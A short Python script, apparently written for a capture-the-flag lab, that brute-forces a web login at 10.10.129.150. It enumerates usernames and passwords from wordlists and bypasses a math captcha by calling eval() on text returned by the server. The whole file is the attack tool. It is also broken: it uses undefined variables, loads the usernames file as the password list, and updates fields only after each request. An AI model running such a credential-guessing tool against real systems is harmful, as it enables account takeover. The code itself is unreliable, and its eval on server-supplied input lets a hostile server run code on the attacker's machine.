import requests


url = 'http://10.10.129.150/login'
usernames = '/root/usernames'
passwords = '/root/passwords'
modo = 'r'
dados = {'username': 'password', 'password': 'username'}
session = requests.Session()
request = s.post(url, data=dados)
users = open(usernames, modo).read().splitlines()
passw = open(usernames, modo).read().splitlines()


def enumera_usuario():
    for nome in users:
        request = session.post(url, data=dados)
        dados['username'] = nome

        content = request.iter_lines()
        for linha in conteudo:
            if bytes('?', 'utf-8') in linha:
                string = linha.decode()
                divisao = string.split('=')
                captcha = divisao[0][4:]
                resultado = eval(captcha)
                dados['captcha'] = resultado
              
        request = session.post(url, data=dados)
        if 'does not exist' not in request.text:
            return nome


def enumera_senha():
    usuario = enumera_usuario()
    dados['username'] = usuario
    for senha in passw:
        request = session.post(url, data=dados)
        dados['password'] = senha

        content = request.iter_lines()
        for linha in content:
            if bytes('?', 'utf-8') in linha:
                string = linha.decode()
                div = string.split('=')
                captcha = div[0][4:]
                res = eval(captcha)
                dados['captcha'] = res

        request = session.post(url, data=dados)

        if 'Invalid password' not in request.text:
            return senha


saida1 = enumera_usuario()
saida2 = enumera_senha()

print('Aguarde enquanto a força bruta é executada...')

print(f'Usuário: {saida1}'
      f'Senha: {saida2}')
